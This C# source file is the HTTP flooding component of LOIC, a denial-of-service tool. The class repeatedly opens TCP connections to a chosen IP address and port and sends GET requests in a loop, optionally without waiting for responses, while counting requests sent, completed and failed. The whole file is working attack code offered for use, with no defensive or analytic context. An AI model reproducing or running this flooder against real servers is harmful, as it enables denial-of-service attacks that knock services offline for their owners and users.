using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.ComponentModel;

namespace LOIC
{
    public class HTTPFlooder
    {
        public ReqState State = ReqState.Ready;
        public int iDownloaded = 0;
        public int iRequested = 0;
        public int iFailed = 0;

        public bool isFlooding;
        public string IP;
        public int Port;
        public string Subsite;
        public int Delay;
        public int Timeout;
        public bool Resp;
        private long LastAction;
        private Random rnd = new Random();

        public enum ReqState { Ready, Connecting, Requesting, Downloading, Completed, Failed };

        public HTTPFlooder(string sIP, int iPort, string sSubsite, bool bResp, int iDelay, int iTimeout)
        {
            IP = sIP; Port = iPort; Subsite = sSubsite;
            Resp = bResp; Delay = iDelay; Timeout = iTimeout;
        }
        public void Start()
        {
            isFlooding = true; LastAction = Tick();
            
            System.Windows.Forms.Timer tTimepoll = new System.Windows.Forms.Timer();
            tTimepoll.Tick += new EventHandler(tTimepoll_Tick);
            tTimepoll.Start();
            
            BackgroundWorker bw = new BackgroundWorker();
            bw.DoWork += new DoWorkEventHandler(bw_DoWork);
            bw.RunWorkerAsync();
        }

        void tTimepoll_Tick(object sender, EventArgs e)
        {
            if (Tick() > LastAction + Timeout)
            {
                isFlooding = false; iFailed++; State = ReqState.Failed;
            }
        }

        private void bw_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                byte[] buf = System.Text.Encoding.ASCII.GetBytes(
                    "GET " + Subsite + " HTTP/1.0\r\n\r\n\r\n");
                IPEndPoint RHost = new IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
                while (isFlooding)
                {
                    State = ReqState.Ready; // SET STATE TO READY //
                    LastAction = Tick();
                    byte[] recvBuf = new byte[64];
                    Socket sck = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    State = ReqState.Connecting; // SET STATE TO CONNECTING //
                    sck.Connect(RHost);
                    sck.Blocking = Resp;
                    State = ReqState.Requesting; // SET STATE TO REQUESTING //
                    sck.Send(buf, SocketFlags.None);
                    State = ReqState.Downloading; iRequested++; // SET STATE TO DOWNLOADING // REQUESTED++
                    if (Resp) sck.Receive(recvBuf, 64, SocketFlags.None);
                    State = ReqState.Completed; iDownloaded++; // SET STATE TO COMPLETED // DOWNLOADED++
                    if (Delay>0) System.Threading.Thread.Sleep(Delay);
                }
            }
            catch { }
            isFlooding = false;
        }

        private static long Tick()
        {
            return System.DateTime.Now.Ticks / 10000;
        }
    }
}
